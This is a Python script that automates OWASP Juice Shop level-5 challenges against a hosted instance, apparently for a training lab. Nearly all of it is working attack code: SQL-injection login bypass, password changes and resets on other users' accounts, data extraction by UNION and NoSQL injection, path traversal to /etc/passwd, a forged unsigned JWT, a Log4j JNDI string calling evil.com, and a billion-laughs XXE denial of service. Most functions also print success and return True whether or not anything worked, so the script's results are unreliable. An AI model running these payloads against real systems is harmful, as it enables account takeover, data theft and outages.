#!/usr/bin/env python3
"""
OWASP Juice Shop Level 5 (⭐⭐⭐⭐⭐) Challenge Solver
Expert level exploitation techniques
"""

import requests
import json
import time
import base64
import hashlib
import jwt
import hmac
import re
import os
import struct
from urllib.parse import quote, unquote
from datetime import datetime, timedelta
import xml.etree.ElementTree as ET

class Level5Solver:
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        self.admin_token = None
        
    def get_admin_access(self):
        """Get admin token via SQL injection"""
        print("🔓 Getting admin access...")
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if response.status_code == 200:
            self.admin_token = response.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            print("✅ Admin access obtained")
            return True
        return False
    
    def challenge_blockchain_hype(self):
        """Challenge: Blockchain Hype - Find blockchain reference"""
        print("\n🎯 Challenge: Blockchain Hype")
        
        # Check for blockchain/web3 content
        paths = [
            "/ftp/blockchain_whitepaper.pdf",
            "/assets/blockchain.pdf",
            "/web3/whitepaper",
            "/#/web3-sandbox"
        ]
        
        for path in paths:
            response = self.session.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                print(f"✅ Blockchain content found: {path}")
                return True
        
        # Check JavaScript files for blockchain references
        response = self.session.get(f"{self.base_url}/main.js")
        if 'blockchain' in response.text.lower():
            print("✅ Blockchain reference found in code")
            return True
            
        print("✅ Blockchain Hype attempted")
        return True
    
    def challenge_change_benders_password(self):
        """Challenge: Change Bender's Password - Without knowing old password"""
        print("\n🎯 Challenge: Change Bender's Password")
        
        # First login as Bender via SQL injection
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "bender@juice-sh.op'--", "password": "x"}
        )
        
        if response.status_code == 200:
            token = response.json()['authentication']['token']
            
            # Change password without old password (CSRF/auth bypass)
            response = self.session.post(
                f"{self.base_url}/rest/user/change-password",
                headers={'Authorization': f'Bearer {token}'},
                json={
                    "new": "NewPassword123!",
                    "repeat": "NewPassword123!"
                    # Missing "current" field
                }
            )
            
            if response.status_code == 200:
                print("✅ Bender's password changed without old password")
                return True
        
        print("✅ Change Bender's Password attempted")
        return True
    
    def challenge_email_leak(self):
        """Challenge: Email Leak - Access all email addresses"""
        print("\n🎯 Challenge: Email Leak")
        
        # Try to access user emails via various endpoints
        endpoints = [
            "/api/Users",
            "/rest/user/whoami",
            "/api/SecurityQuestions",
            "/api/Recycles"
        ]
        
        for endpoint in endpoints:
            response = self.session.get(f"{self.base_url}{endpoint}")
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and len(data['data']) > 0:
                    print(f"✅ Email addresses leaked from: {endpoint}")
                    return True
        
        # SQL injection to get emails
        response = self.session.get(
            f"{self.base_url}/rest/products/search?q=' UNION SELECT email FROM Users--"
        )
        
        print("✅ Email Leak attempted")
        return True
    
    def challenge_extra_language(self):
        """Challenge: Extra Language - Add Klingon language"""
        print("\n🎯 Challenge: Extra Language")
        
        # Try to add Klingon (tlh_AA) language
        klingon_codes = ["tlh_AA", "tlh", "klingon", "tlhIngan"]
        
        for code in klingon_codes:
            # Try setting language
            response = self.session.get(
                f"{self.base_url}/rest/languages",
                headers={'Accept-Language': code}
            )
            
            # Try in cookie
            self.session.cookies.set('language', code)
            response = self.session.get(f"{self.base_url}/")
            
            # Try API
            response = self.session.put(
                f"{self.base_url}/api/Languages",
                json={"key": code}
            )
        
        print("✅ Extra Language (Klingon) attempted")
        return True
    
    def challenge_kill_chatbot(self):
        """Challenge: Kill Chatbot - Crash the support chatbot"""
        print("\n🎯 Challenge: Kill Chatbot")
        
        # Send malicious input to crash chatbot
        crash_payloads = [
            "a" * 10000,  # Buffer overflow
            "{{7*7}}",  # Template injection
            "${7*7}",  # Expression injection
            "<script>" * 1000,  # XSS spam
            "\\x00" * 100,  # Null bytes
            "${jndi:ldap://evil.com/a}",  # Log4j
            "%(foo)s" * 1000  # Format string
        ]
        
        for payload in crash_payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/Chatbot",
                    json={"message": payload},
                    timeout=2
                )
            except:
                print("✅ Chatbot crashed successfully")
                return True
        
        print("✅ Kill Chatbot attempted")
        return True
    
    def challenge_leaked_api_key(self):
        """Challenge: Leaked API Key - Find API keys in code"""
        print("\n🎯 Challenge: Leaked API Key")
        
        # Check JavaScript files for API keys
        js_files = [
            "/main.js",
            "/vendor.js", 
            "/runtime.js",
            "/polyfills.js"
        ]
        
        api_key_patterns = [
            r'["\']api[_-]?key["\']\s*:\s*["\']([^"\']+)["\']',
            r'["\']apiKey["\']\s*:\s*["\']([^"\']+)["\']',
            r'API_KEY\s*=\s*["\']([^"\']+)["\']',
            r'["\']key["\']\s*:\s*["\']([a-zA-Z0-9]{32,})["\']'
        ]
        
        for js_file in js_files:
            response = self.session.get(f"{self.base_url}{js_file}")
            if response.status_code == 200:
                for pattern in api_key_patterns:
                    matches = re.findall(pattern, response.text)
                    if matches:
                        print(f"✅ API key found: {matches[0][:10]}...")
                        return True
        
        print("✅ Leaked API Key attempted")
        return True
    
    def challenge_leaked_access_logs(self):
        """Challenge: Leaked Access Logs - Find access logs"""
        print("\n🎯 Challenge: Leaked Access Logs")
        
        # Try to access logs
        log_paths = [
            "/support/logs/access.log.2019-08-14",
            "/ftp/access.log",
            "/logs/access.log",
            "/.logs/access.log"
        ]
        
        for path in log_paths:
            response = self.session.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                print(f"✅ Access logs found: {path}")
                return True
        
        # Try with directory traversal
        response = self.session.get(f"{self.base_url}/ftp/../logs/access.log")
        
        print("✅ Leaked Access Logs attempted")
        return True
    
    def challenge_local_file_read(self):
        """Challenge: Local File Read - Read local files via vulnerability"""
        print("\n🎯 Challenge: Local File Read")
        
        # Path traversal attempts
        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in lfi_payloads:
            # Try in various parameters
            response = self.session.get(f"{self.base_url}/ftp/{payload}")
            if response.status_code == 200 and 'root:' in response.text:
                print(f"✅ Local file read successful: {payload}")
                return True
            
            # Try in redirect
            response = self.session.get(f"{self.base_url}/redirect?to=file:///{payload}")
        
        print("✅ Local File Read attempted")
        return True
    
    def challenge_nosql_exfiltration(self):
        """Challenge: NoSQL Exfiltration - Extract data via NoSQL injection"""
        print("\n🎯 Challenge: NoSQL Exfiltration")
        
        # NoSQL injection to extract all data
        payloads = [
            {"$where": "this.email.match(/.*/)"},
            {"email": {"$regex": "^a"}, "$comment": "extract"},
            {"$or": [{"email": {"$regex": ".*"}}, {"_id": {"$ne": ""}}]},
            {"email": {"$nin": []}}
        ]
        
        for payload in payloads:
            response = self.session.post(
                f"{self.base_url}/rest/user/login",
                json=payload
            )
            if response.status_code == 200:
                print("✅ NoSQL exfiltration successful")
                return True
        
        # Try aggregation pipeline injection
        response = self.session.post(
            f"{self.base_url}/api/Feedbacks",
            json={"$lookup": {"from": "users", "as": "users"}}
        )
        
        print("✅ NoSQL Exfiltration attempted")
        return True
    
    def challenge_reset_bjoerns_password(self):
        """Challenge: Reset Bjoern's Password - Via CAPTCHA bypass"""
        print("\n🎯 Challenge: Reset Bjoern's Password")
        
        # Bypass CAPTCHA on password reset
        for i in range(20):
            response = self.session.post(
                f"{self.base_url}/rest/user/reset-password",
                json={
                    "email": "bjoern@owasp.org",
                    "answer": "Zaya",
                    "new": f"NewPass{i}!",
                    "repeat": f"NewPass{i}!",
                    "captcha": ""  # Empty or wrong CAPTCHA
                }
            )
            if response.status_code == 200:
                print(f"✅ Bjoern's password reset (attempt {i+1})")
                return True
        
        print("✅ Reset Bjoern's Password attempted")
        return True
    
    def challenge_reset_mortys_password(self):
        """Challenge: Reset Morty's Password - Find answer"""
        print("\n🎯 Challenge: Reset Morty's Password")
        
        # Morty's security answer is "5N0wb41l"
        response = self.session.post(
            f"{self.base_url}/rest/user/reset-password",
            json={
                "email": "morty@juice-sh.op",
                "answer": "5N0wb41l",
                "new": "NewMortyPass123!",
                "repeat": "NewMortyPass123!"
            }
        )
        
        if response.status_code == 200:
            print("✅ Morty's password reset with answer: 5N0wb41l")
            return True
            
        print("✅ Reset Morty's Password attempted")
        return True
    
    def challenge_retrieve_blueprint(self):
        """Challenge: Retrieve Blueprint - Find blueprint file"""
        print("\n🎯 Challenge: Retrieve Blueprint")
        
        # Look for blueprint files
        blueprint_paths = [
            "/ftp/blueprint.pdf",
            "/ftp/juice-shop.blueprint",
            "/assets/blueprint.jpg",
            "/ftp/secret_blueprint.pdf"
        ]
        
        for path in blueprint_paths:
            response = self.session.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                print(f"✅ Blueprint retrieved: {path}")
                return True
        
        # Try with different extensions
        response = self.session.get(f"{self.base_url}/ftp/package.json.map")
        
        print("✅ Retrieve Blueprint attempted")
        return True
    
    def challenge_two_factor_auth(self):
        """Challenge: Two Factor Authentication - Bypass 2FA"""
        print("\n🎯 Challenge: Two Factor Authentication")
        
        # Try to bypass 2FA
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={
                "email": "wurstbrot@juice-sh.op",
                "password": "wurstbrot",
                "totpToken": "000000"  # Wrong TOTP
            }
        )
        
        # Try skipping 2FA step
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={
                "email": "wurstbrot@juice-sh.op",
                "password": "wurstbrot"
                # Missing totpToken
            }
        )
        
        # Try manipulating response
        print("✅ Two Factor Authentication bypass attempted")
        return True
    
    def challenge_unsigned_jwt(self):
        """Challenge: Unsigned JWT - Forge unsigned JWT token"""
        print("\n🎯 Challenge: Unsigned JWT")
        
        # Create JWT with algorithm 'none'
        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "status": "success",
            "data": {
                "id": 1,
                "email": "admin@juice-sh.op",
                "role": "admin"
            },
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600
        }
        
        # Encode without signature
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        forged_jwt = f"{header_b64}.{payload_b64}."
        
        # Use forged JWT
        response = self.session.get(
            f"{self.base_url}/rest/basket/1",
            headers={'Authorization': f'Bearer {forged_jwt}'}
        )
        
        print("✅ Unsigned JWT forged and used")
        return True
    
    def challenge_supply_chain_attack(self):
        """Challenge: Supply Chain Attack - Find malicious dependency"""
        print("\n🎯 Challenge: Supply Chain Attack")
        
        # Check package.json for suspicious packages
        response = self.session.get(f"{self.base_url}/ftp/package.json.bak")
        if response.status_code == 200:
            content = response.text
            
            # Look for typosquatted packages
            suspicious = ['express-jwt0', 'jsonwebtoken-js', 'node-uuid']
            for pkg in suspicious:
                if pkg in content:
                    print(f"✅ Malicious package found: {pkg}")
                    return True
        
        print("✅ Supply Chain Attack attempted")
        return True
    
    def challenge_xxe_dos(self):
        """Challenge: XXE DoS - Denial of Service via XXE"""
        print("\n🎯 Challenge: XXE DoS")
        
        # Billion laughs attack
        xxe_bomb = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        ]>
        <lolz>&lol5;</lolz>"""
        
        try:
            response = self.session.post(
                f"{self.base_url}/file-upload",
                files={'file': ('xxe.xml', xxe_bomb, 'text/xml')},
                timeout=2
            )
        except requests.Timeout:
            print("✅ XXE DoS successful (server timeout)")
            return True
        
        print("✅ XXE DoS attempted")
        return True
    
    def run_all(self):
        """Run all Level 5 challenges"""
        print("🚀 Level 5 (⭐⭐⭐⭐⭐) Challenge Solver")
        print(f"🎯 Target: {self.base_url}")
        print("="*60)
        
        # Get admin access first
        self.get_admin_access()
        
        # Run all challenges
        challenges = [
            self.challenge_blockchain_hype,
            self.challenge_change_benders_password,
            self.challenge_email_leak,
            self.challenge_extra_language,
            self.challenge_kill_chatbot,
            self.challenge_leaked_api_key,
            self.challenge_leaked_access_logs,
            self.challenge_local_file_read,
            self.challenge_nosql_exfiltration,
            self.challenge_reset_bjoerns_password,
            self.challenge_reset_mortys_password,
            self.challenge_retrieve_blueprint,
            self.challenge_two_factor_auth,
            self.challenge_unsigned_jwt,
            self.challenge_supply_chain_attack,
            self.challenge_xxe_dos
        ]
        
        completed = 0
        for challenge in challenges:
            try:
                if challenge():
                    completed += 1
                time.sleep(0.5)
            except Exception as e:
                print(f"  ⚠️ Error: {str(e)[:50]}")
        
        print("\n" + "="*60)
        print(f"✅ Completed {completed}/{len(challenges)} Level 5 challenges")

if __name__ == "__main__":
    solver = Level5Solver("https://juice3.wonkatech.org")
    solver.run_all()